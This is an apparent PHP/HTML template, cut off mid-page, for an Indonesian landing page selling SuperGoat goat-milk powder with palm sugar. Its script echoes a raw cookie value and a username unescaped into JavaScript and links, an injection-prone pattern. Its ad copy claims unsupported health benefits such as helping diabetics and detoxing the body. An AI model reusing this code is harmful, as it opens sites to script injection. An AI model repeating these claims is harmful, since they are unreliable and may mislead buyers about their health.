<!DOCTYPE html>
<html lang="id-ID">
<!-- Mirrored from kedai.supergoat.biz/toko/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jan 2020 15:45:41 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<!-- /Added by HTTrack -->

<head>
    <meta charset="UTF-8">
    <link media="all" href="<?= base_url();?>/assets/index/wp-content/cache/autoptimize/css/autoptimize_ba14ffc12a804696cab9ef027a859e47.css" rel="stylesheet" />
    <link media="only screen and (max-width: 768px)" href="<?= base_url();?>/assets/index/wp-content/cache/autoptimize/css/autoptimize_dcb2de333eec7ab4ae31385ed8d6a393.css" rel="stylesheet" />
    <title>SUPERGOAT</title>
    <script>
        /* You can add more configuration options to webfontloader by previously defining the WebFontConfig with your options */
        if (typeof WebFontConfig === "undefined") {
            WebFontConfig = new Object();
        }
        WebFontConfig['google'] = {
            families: ['Roboto:400,700']
        };

        (function() {
            var wf = document.createElement('script');
            wf.src = '../../ajax.googleapis.com/ajax/libs/webfont/1.5.3/webfont.js';
            wf.type = 'text/javascript';
            wf.async = 'true';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(wf, s);
        })();
    </script>
    <link rel='dns-prefetch' href='<?= base_url();?>/assets/index/' />
    <link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
    <link rel='dns-prefetch' href='http://s.w.org/' />
    <link rel="alternate" type="application/rss+xml" title="Supergoat.biz &raquo; Feed" href="http://kedai.supergoat.biz/feed/" />
    <link rel="alternate" type="application/rss+xml" title="Supergoat.biz &raquo; Umpan Komentar" href="http://kedai.supergoat.biz/comments/feed/" />
    <meta property="og:title" content="SuperGoat" />
    <meta property="og:url" content="http://kedai.supergoat.biz/toko/" />
    <meta property="og:description" content="Susu Kambing Etawa Bubuk Gula Aren" />
    <meta property="og:image" content="<?= base_url();?>/assets/index/wp-content/uploads/2019/11/reseller-supergoat.png" />
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script type="text/javascript">
        $(function () {
                // hideProgres();
                saveTrafic();
          });
          <?php
            if(empty($username))$username = "andyadmin";
          ?>
          function saveTrafic(){
            $.post(' ../../ground/manage/saveTrafic'
              ,{
                    funnel : '<?= $funnel; ?>',
                    username : '<?= $username; ?>',
                    cookie : '<?=  $_COOKIE['SuryaDutaCookie']; ?>',
                }
              ,function(result) {

              }
              ,"json"
            );
          }
    </script>
    <script type="text/javascript">
        window._wpemojiSettings = {
            "baseUrl": "https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/",
            "ext": ".png",
            "svgUrl": "https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/",
            "svgExt": ".svg",
            "source": {
                "concatemoji": "http:\/\/supergoat.biz\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.5"
            }
        };
        ! function(a, b, c) {
            function d(a, b) {
                var c = String.fromCharCode;
                l.clearRect(0, 0, k.width, k.height), l.fillText(c.apply(this, a), 0, 0);
                var d = k.toDataURL();
                l.clearRect(0, 0, k.width, k.height), l.fillText(c.apply(this, b), 0, 0);
                var e = k.toDataURL();
                return d === e
            }

            function e(a) {
                var b;
                if (!l || !l.fillText) return !1;
                switch (l.textBaseline = "top", l.font = "600 32px Arial", a) {
                    case "flag":
                        return !(b = d([55356, 56826, 55356, 56819], [55356, 56826, 8203, 55356, 56819])) && (b = d([55356, 57332, 56128, 56423, 56128, 56418, 56128, 56421, 56128, 56430, 56128, 56423, 56128, 56447], [55356, 57332, 8203, 56128, 56423, 8203, 56128, 56418, 8203, 56128, 56421, 8203, 56128, 56430, 8203, 56128, 56423, 8203, 56128, 56447]), !b);
                    case "emoji":
                        return b = d([55357, 56424, 55356, 57342, 8205, 55358, 56605, 8205, 55357, 56424, 55356, 57340], [55357, 56424, 55356, 57342, 8203, 55358, 56605, 8203, 55357, 56424, 55356, 57340]), !b
                }
                return !1
            }

            function f(a) {
                var c = b.createElement("script");
                c.src = a, c.defer = c.type = "text/javascript", b.getElementsByTagName("head")[0].appendChild(c)
            }
            var g, h, i, j, k = b.createElement("canvas"),
                l = k.getContext && k.getContext("2d");
            for (j = Array("flag", "emoji"), c.supports = {
                    everything: !0,
                    everythingExceptFlag: !0
                }, i = 0; i < j.length; i++) c.supports[j[i]] = e(j[i]), c.supports.everything = c.supports.everything && c.supports[j[i]], "flag" !== j[i] && (c.supports.everythingExceptFlag = c.supports.everythingExceptFlag && c.supports[j[i]]);
            c.supports.everythingExceptFlag = c.supports.everythingExceptFlag && !c.supports.flag, c.DOMReady = !1, c.readyCallback = function() {
                c.DOMReady = !0
            }, c.supports.everything || (h = function() {
                c.readyCallback()
            }, b.addEventListener ? (b.addEventListener("DOMContentLoaded", h, !1), a.addEventListener("load", h, !1)) : (a.attachEvent("onload", h), b.attachEvent("onreadystatechange", function() {
                "complete" === b.readyState && c.readyCallback()
            })), g = c.source || {}, g.concatemoji ? f(g.concatemoji) : g.wpemoji && g.twemoji && (f(g.twemoji), f(g.wpemoji)))
        }(window, document, window._wpemojiSettings);
    </script>
    <link rel='stylesheet' id='cepatlakoo-fonts-css' href='https://fonts.googleapis.com/css?family=Montserrat%3A400%2C700' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-global-css' href='<?= base_url();?>/assets/index/wp-content/cache/autoptimize/css/autoptimize_single_a4dc05baaa4a227c361eb0893cb6b8aec17d.css?ver=1564547443' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-post-440-css' href='<?= base_url();?>/assets/index/wp-content/cache/autoptimize/css/autoptimize_single_804fc7c7b31dc5d7816f0f9280a24f356272.css?ver=1579511437' type='text/css' media='all' />
    <link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;ver=5.2.5' type='text/css' media='all' />
    <script type="text/template" id="tmpl-variation-template">
        <div class="woocommerce-variation-description">{{{ data.variation.variation_description }}}</div>
        <div class="woocommerce-variation-price">{{{ data.variation.price_html }}}</div>
        <div class="woocommerce-variation-availability">{{{ data.variation.availability_html }}}</div>
    </script>
    <script type="text/template" id="tmpl-unavailable-variation-template">
        <p>Maaf, produk ini tidak tersedia. Silakan pilih kombinasi yang berbeda.</p>
    </script>
    <script type='text/javascript' src='<?= base_url();?>/assets/index/wp-includes/js/jquery/jquery4a5f.js?ver=1.12.4-wp'></script>
    <script type='text/javascript' src='<?= base_url();?>/assets/index/wp-content/cache/autoptimize/js/autoptimize_single_65e956ba2dc73e60db4261a71c1df96b6619.js?ver=5.2.5'></script>
    <script type='text/javascript' src='<?= base_url();?>/assets/index/wp-content/cache/autoptimize/js/autoptimize_single_6731123b0a11b45cac3b0499e9700af36619.js?ver=5.2.5'></script>
    <link rel='https://api.w.org/' href='http://kedai.supergoat.biz/wp-json/' />
    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="<?= base_url();?>/assets/index/xmlrpc.php?rsd" />
    <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="<?= base_url();?>/assets/index/wp-includes/wlwmanifest.xml" />
    <meta name="generator" content="WordPress 5.2.5" />
    <meta name="generator" content="WooCommerce 3.6.5" />
    <link rel="canonical" href="index.html" />
    <link rel='shortlink' href='http://kedai.supergoat.biz/?p=440' />
    <link rel="alternate" type="application/json+oembed" href="http://kedai.supergoat.biz/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fkedai.supergoat.biz%2Ftoko%2F" />
    <link rel="alternate" type="text/xml+oembed" href="http://kedai.supergoat.biz/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fkedai.supergoat.biz%2Ftoko%2F&amp;format=xml" />
    <noscript>
        <style>
            .woocommerce-product-gallery {
                opacity: 1 !important;
            }
        </style>
    </noscript>
    <link rel="icon" href="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/supergoat-100x100.png" sizes="32x32" />
    <link rel="icon" href="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/supergoat.png" sizes="192x192" />
    <link rel="apple-touch-icon-precomposed" href="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/supergoat.png" />
    <meta name="msapplication-TileImage" content="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/supergoat.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
</head>

<body class="page-template page-template-elementor_canvas page page-id-440 wp-custom-logo has-navmenu has-megamenu woocommerce-no-js woocommerce elementor-default elementor-template-canvas elementor-page elementor-page-440">
    <div id="main" fb-pixel="ViewContent">
        <div data-elementor-type="post" data-elementor-id="440" class="elementor elementor-440" data-elementor-settings="[]">
            <div class="elementor-inner">
                <div class="elementor-section-wrap">
                    <section class="elementor-element elementor-element-1757967c elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="1757967c" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-5d6cf257 elementor-column elementor-col-100 elementor-top-column" data-id="5d6cf257" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-background-overlay"></div>
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-db8f3b5 elementor-widget elementor-widget-image" data-id="db8f3b5" data-element_type="widget" data-widget_type="image.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-image">
                                                        <a href="http://member.saudagarkaya.com/" data-elementor-open-lightbox=""> <img width="36" height="36" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/logo-login.png" class="attachment-large size-large" alt="" /> </a>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="elementor-element elementor-element-a912a46 elementor-widget elementor-widget-image" data-id="a912a46" data-element_type="widget" data-widget_type="image.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-image"> <img width="960" height="676" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/1-6.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/1-6.png 960w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/1-6-300x211.png 300w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/1-6-768x541.png 768w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/1-6-860x606.png 860w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/1-6-600x423.png 600w" sizes="(max-width: 960px) 100vw, 960px" /></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-4461597a elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="4461597a" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-4cc381e3 elementor-column elementor-col-100 elementor-top-column" data-id="4cc381e3" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-cfba0b6 elementor-widget elementor-widget-heading" data-id="cfba0b6" data-element_type="widget" data-widget_type="heading.default">
                                                <div class="elementor-widget-container">
                                                    <h2 class="elementor-heading-title elementor-size-default">Simak Video Berikut</h2></div>
                                            </div>
                                            <section class="elementor-element elementor-element-133adb5e elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="133adb5e" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-557bed6e elementor-column elementor-col-100 elementor-inner-column" data-id="557bed6e" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-65b85e1b elementor-aspect-ratio-169 elementor-widget elementor-widget-video" data-id="65b85e1b" data-element_type="widget" data-settings="{&quot;aspect_ratio&quot;:&quot;169&quot;}" data-widget_type="video.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-wrapper elementor-fit-aspect-ratio elementor-open-inline">
                                                                                <iframe class="elementor-video-iframe" allowfullscreen src="https://www.youtube.com/embed/mTe9AATyt2o?feature=oembed&amp;start&amp;end&amp;wmode=opaque&amp;loop=0&amp;controls=1&amp;mute=0&amp;rel=0&amp;modestbranding=0"></iframe>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-2661f583 elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default elementor-section elementor-top-section" data-id="2661f583" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-69d4f72c elementor-column elementor-col-100 elementor-top-column" data-id="69d4f72c" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <div class="elementor-element elementor-element-bfba40d elementor-widget elementor-widget-spacer" data-id="bfba40d" data-element_type="widget" data-widget_type="spacer.default">
                                                <div class="elementor-widget-container">
                                                    <div class="elementor-spacer">
                                                        <div class="elementor-spacer-inner"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="elementor-element elementor-element-13682d67 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="13682d67" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
                        <div class="elementor-background-overlay"></div>
                        <div class="elementor-container elementor-column-gap-no">
                            <div class="elementor-row">
                                <div class="elementor-element elementor-element-54098e9c elementor-column elementor-col-100 elementor-top-column" data-id="54098e9c" data-element_type="column">
                                    <div class="elementor-column-wrap  elementor-element-populated">
                                        <div class="elementor-widget-wrap">
                                            <section class="elementor-element elementor-element-286b568 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="286b568" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-no">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-8dbde37 elementor-column elementor-col-50 elementor-inner-column" data-id="8dbde37" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-d94f410 elementor-widget elementor-widget-image" data-id="d94f410" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="227" height="72" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/tentang-supergoat.png" class="attachment-large size-large" alt="" /></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-5f6eee0 elementor-widget elementor-widget-heading" data-id="5f6eee0" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">Susu SuperGoat merupakan sebuah inovasi baru susu kambing etawa bubuk yang dikolaborasikan dengan gula aren murni. Meski sudah diolah menjadi bubuk, khasiat dan manfaat dari susu alami ini masih terjaga. Hal ini dikarenakan produksinya diawasi dengan sangat ketat dari hulu sampai hilir, sehingga ada jaminan kualitas terbaik yang akan dirasakan oleh konsumen.</p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-4cb5e7d elementor-column elementor-col-50 elementor-inner-column" data-id="4cb5e7d" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-868c2e8 elementor-widget elementor-widget-image" data-id="868c2e8" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="408" height="254" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/FOTO-SUPERGOAT-DENGAN-BATU-TRANSPARAN.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/FOTO-SUPERGOAT-DENGAN-BATU-TRANSPARAN.png 408w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/FOTO-SUPERGOAT-DENGAN-BATU-TRANSPARAN-300x187.png 300w" sizes="(max-width: 408px) 100vw, 408px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-b8c086c elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="b8c086c" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-no">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-1181f76 elementor-column elementor-col-100 elementor-inner-column" data-id="1181f76" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-ffd32ca elementor-widget elementor-widget-image" data-id="ffd32ca" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="227" height="73" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/manfaat-supergoat.png" class="attachment-large size-large" alt="" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-e3d9a2b elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="e3d9a2b" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-89e93b7 elementor-column elementor-col-50 elementor-inner-column" data-id="89e93b7" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-39778f6 elementor-widget elementor-widget-image" data-id="39778f6" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="500" height="234" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/SUSU-ANYAR.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/SUSU-ANYAR.png 500w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/SUSU-ANYAR-300x140.png 300w" sizes="(max-width: 500px) 100vw, 500px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-9f5e704 elementor-column elementor-col-50 elementor-inner-column" data-id="9f5e704" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-7107de5 elementor-align-left elementor-mobile-align-left elementor-icon-list--layout-traditional elementor-widget elementor-widget-icon-list" data-id="7107de5" data-element_type="widget" data-widget_type="icon-list.default">
                                                                        <div class="elementor-widget-container">
                                                                            <ul class="elementor-icon-list-items">
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Sangat membantu untuk penderita diabetes.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Meningkatkan daya tahan tubuh.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Membantu mengeluarkan toxin/racun dari tubuh.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Menstabilkan kolesterol dalam tubuh.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Melancarkan sistem pencernaan.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Membantu mencerdaskan otak anak.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Membantu pertumbuhan tulang dan gigi.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Baik di konsumsi ibu hamil dan menyusui</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">MENINGKATKAN VITALITAS</span></li>
                                                                            </ul>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-fcd0a53 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="fcd0a53" data-element_type="section">
                                                <div class="elementor-container elementor-column-gap-no">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-d1aab05 elementor-column elementor-col-50 elementor-inner-column" data-id="d1aab05" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-6fe5988 elementor-widget elementor-widget-image" data-id="6fe5988" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="257" height="82" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/susu-supergoat-gula-aren.png" class="attachment-large size-large" alt="" /></div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-a45d623 elementor-widget elementor-widget-image" data-id="a45d623" data-element_type="widget" data-widget_type="image.default">
                                                                        <div class="elementor-widget-container">
                                                                            <div class="elementor-image"> <img width="400" height="311" src="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/FOTO-SUPERGOAT-GULA-AREN.png" class="attachment-large size-large" alt="" srcset="<?= base_url();?>/assets/index/wp-content/uploads/2020/01/FOTO-SUPERGOAT-GULA-AREN.png 400w, <?= base_url();?>/assets/index/wp-content/uploads/2020/01/FOTO-SUPERGOAT-GULA-AREN-300x233.png 300w" sizes="(max-width: 400px) 100vw, 400px" /></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-2495e34 elementor-column elementor-col-50 elementor-inner-column" data-id="2495e34" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-cad0ff2 elementor-widget elementor-widget-heading" data-id="cad0ff2" data-element_type="widget" data-widget_type="heading.default">
                                                                        <div class="elementor-widget-container">
                                                                            <p class="elementor-heading-title elementor-size-default">Kita ingin konsumen merasakan manfaat optimal dari produk kita, untuk manfaat susu kambing tadi sudah dijelaskan sebelumnya, sedangkan manfaat gula aren sebagai berikut:</p>
                                                                        </div>
                                                                    </div>
                                                                    <div class="elementor-element elementor-element-702015b elementor-icon-list--layout-traditional elementor-widget elementor-widget-icon-list" data-id="702015b" data-element_type="widget" data-widget_type="icon-list.default">
                                                                        <div class="elementor-widget-container">
                                                                            <ul class="elementor-icon-list-items">
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Indeks glikemik rendah (35) dibanding gula tebu (70).</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Protein yang berfungsi untuk memperkuat otot dan sel – sel tubuh untuk menjaga kesehatan.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Serat yang berfungsi untuk melancarkan sistem pencernaan di dalam tubuh agar menjaga kesehatan didalam tubuh.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Asam amino dan juga vitamin – vitamin alami yang diperlukan oleh tubuh.</span></li>
                                                                                <li class="elementor-icon-list-item"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-check"></i> </span> <span class="elementor-icon-list-text">Karena tidak melalui proses pemurnian, gula dari pohon aren kaya akan vitamin B, kalsium, zat besi, magnesium, kalium, dan sodium.</span></li>
                                                                            </ul>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>

                                            <?php
                                                $nomor_telepon = '62'.substr($member['nomor_telepon'],1);
                                            ?>
                                            <section class="elementor-element elementor-element-c4cef3d elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="c4cef3d" data-element_type="section" >
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-f8c3650 elementor-column elementor-col-33 elementor-inner-column" data-id="f8c3650" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-91bfed5 elementor-column elementor-col-33 elementor-inner-column" data-id="91bfed5" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-885891c elementor-widget elementor-widget-text-editor" data-id="885891c" data-element_type="widget" data-widget_type="text-editor.default">
                                                                        <div class="elementor-widget-container" style="background-color:green;">
                                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                                <p></p>
                                                                                <p><span style="color: #ffffff;"><a href="checkout/<?= $username; ?>" target="">BELI SEKARANG</a></span></p>

                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <div class="elementor-element elementor-element-dbea815 elementor-column elementor-col-33 elementor-inner-column" data-id="dbea815" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-c4cef3d elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="c4cef3d" data-element_type="section" >
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row">
                                                        <div class="elementor-element elementor-element-f8c3650 elementor-column elementor-col-33 elementor-inner-column" data-id="f8c3650" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                        <div class="elementor-element elementor-element-91bfed5 elementor-column elementor-col-33 elementor-inner-column" data-id="91bfed5" data-element_type="column">
                                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                                <div class="elementor-widget-wrap">
                                                                    <div class="elementor-element elementor-element-885891c elementor-widget elementor-widget-text-editor" data-id="885891c" data-element_type="widget" data-widget_type="text-editor.default">
                                                                        <div class="elementor-widget-container" style="background-color:green;">
                                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                                <p></p>
                                                                                <p><span style="color: #ffffff;"><a href="https://wa.me/<?= $nomor_telepon; ?>?text=Halo+ka%2C+saya+ingin+pesan+SuperGoat.+Bagaimana+caranya%3F" target="blank">KONSULTASI LEWAT WA</a></span></p>

                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <div class="elementor-element elementor-element-dbea815 elementor-column elementor-col-33 elementor-inner-column" data-id="dbea815" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="elementor-element elementor-element-c4cef3d elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-inner-section" data-id="c4cef3d" data-element_type="section" style='background-color:#ffaf00;margin-top:15px;'>
                                                <div class="elementor-container elementor-column-gap-default">
                                                    <div class="elementor-row" >
                                                        <div class="elementor-element elementor-element-f8c3650 elementor-column elementor-col-33 elementor-inner-column" data-id="f8c3650" data-element_type="column">
                                                            <div class="elementor-column-wrap">
                                                                <div class="elementor-widget-wrap"></div>
                                                            </div>
                                                        </div>
                                                        <br>
                                                                            <h2 style='text-align:center;'>
